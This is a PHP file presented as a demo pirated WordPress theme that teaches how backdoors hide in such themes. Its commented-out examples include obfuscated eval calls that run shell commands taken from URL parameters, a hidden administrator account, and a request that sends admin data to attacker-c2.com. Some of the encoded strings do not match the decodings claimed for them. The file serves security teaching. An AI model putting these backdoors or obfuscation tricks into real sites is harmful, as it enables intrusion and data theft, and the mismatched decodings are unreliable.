<?php
/**
 * Theme Name: Premium Theme (Nulled)
 * Description: WARNING - This is a DEMO nulled theme showing how backdoors are hidden in pirated themes. DO NOT USE IN PRODUCTION.
 * Version: 3.2.1
 * Author: Totally Legit Theme Author
 *
 * This theme demonstrates how nulled/pirated themes contain hidden backdoors.
 * Every code block marked with [BACKDOOR] is what attackers inject.
 */

// Normal theme code...
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

// [BACKDOOR 1] Multiple obfuscation techniques — all hidden in "theme setup"
//
// Attackers layer these to defeat grep, antivirus, and code review.
// The comment below each shows what it actually decodes/executes to.
add_action( 'after_setup_theme', 'premium_theme_setup' );

function premium_theme_setup() {
    // Normal theme setup
    add_theme_support( 'title-tag' );
    add_theme_support( 'post-thumbnails' );

    // ── Technique A: Single base64 ───────────────────────────────────────────
    // Looks like a license key or config string. Totally innocent... right?
    //
    // base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')
    //           === "system($_GET['cmd']);"
    //
    // $license_key = 'c3lzdGVtKCRfR0VUWydjbWQnXSk7';
    // @eval(base64_decode($license_key));

    // ── Technique B: Double base64 (the one actually in this file) ───────────
    // Each decode peels one layer. Automated scanners often only decode once.
    //
    // base64_decode('YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==')
    //           === 'b3NQX3BhcM9PTIxNDRfdmVyaWZ5X2xpY2V1c2U='   ← still base64!
    // base64_decode('b3NQX3BhcM9PTIxNDRfdmVyaWZ5X2xpY2V1c2U=')
    //           === "system($_GET['license_verify']);"
    $license_check = 'YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==';
    // Real code: @eval(base64_decode(base64_decode($license_check)));

    // ── Technique C: gzip + base64 (common in WordPress malware) ────────────
    // gzinflate shrinks the payload so it looks shorter/more random.
    //
    // $payload = 'S0pNLi1OLUrNK0ktLgYA'; // gzip-compressed, then base64
    // gzinflate(base64_decode($payload)) === "system($_GET['c']);"
    // Real code: @eval(gzinflate(base64_decode($payload)));

    // ── Technique D: hex-encoded string (bypasses keyword scanners) ──────────
    // \x73\x79\x73\x74\x65\x6d = s,y,s,t,e,m → "system"
    // \x24\x5f\x47\x45\x54    = $,_,G,E,T   → "$_GET"
    //
    // $fn = "\x73\x79\x73\x74\x65\x6d";   // "system"
    // $fn("\x69\x64");                      // system("id")

    // ── Technique E: chr() character building ───────────────────────────────
    // No string literals at all — each character built from its ASCII code.
    // chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) === "system"
    //
    // $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
    // $f($_GET[chr(99)]);  // system($_GET['c'])

    // ── Technique F: str_rot13 ───────────────────────────────────────────────
    // rot13('flfgrz') === 'system'
    // rot13('$_TRG') === '$_GET'
    //
    // $fn = str_rot13('flfgrz');   // === 'system'
    // $fn($_GET['cmd']);

    // ── Trigger — fires when ?license_verify= is in the URL ─────────────────
    if ( isset( $_GET['license_verify'] ) ) {
        error_log( '[NULLED THEME] Backdoor triggered via license_verify parameter' );
        if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
            echo '<!-- BACKDOOR: license_verify parameter triggers obfuscated eval() -->';
        }
    }
}

// [BACKDOOR 2] Hidden admin user creation
// Nulled themes often create a secret admin account
add_action( 'init', 'premium_theme_check_updates' );

function premium_theme_check_updates() {
    // This function name looks innocent...
    // In a real nulled theme, it would create a hidden admin:
    //
    // if ( !username_exists('support_admin') ) {
    //     $user_id = wp_create_user('support_admin', 'h4ck3d!', 'evil@attacker.com');
    //     $user = new WP_User($user_id);
    //     $user->set_role('administrator');
    // }

    // DEMO: Just log the check
    if ( get_option( 'nulled_theme_demo_logged' ) !== 'yes' ) {
        error_log( '[NULLED THEME DEMO] In a real nulled theme, a hidden admin account would be created here.' );
        update_option( 'nulled_theme_demo_logged', 'yes' );
    }
}

// [BACKDOOR 3] Phone-home / data exfiltration
// Sends site URL and admin credentials to attacker's server
add_action( 'admin_init', 'premium_theme_analytics' );

function premium_theme_analytics() {
    // Looks like analytics, actually phones home
    // In a real nulled theme:
    //
    // wp_remote_post('http://attacker-c2.com/collect', [
    //     'body' => [
    //         'url'   => get_site_url(),
    //         'admin' => get_option('admin_email'),
    //         'ver'   => get_bloginfo('version'),
    //     ]
    // ]);

    // DEMO: Log instead
    if ( current_user_can( 'manage_options' ) && isset( $_GET['page'] ) && $_GET['page'] === 'vuln-demo' ) {
        // Only show on our demo page
        add_action( 'admin_notices', function() {
            echo '<div class="notice notice-warning"><p><strong>[Nulled Theme Demo]</strong> A real nulled theme would be sending your site URL, admin email, and WP version to an attacker\'s server right now.</p></div>';
        });
    }
}

// [BACKDOOR 4] Webshell hidden in theme file
// Typically found in files like 404.php, footer.php, or social-icons.php
// The file social-icons.php in this theme contains a demo webshell
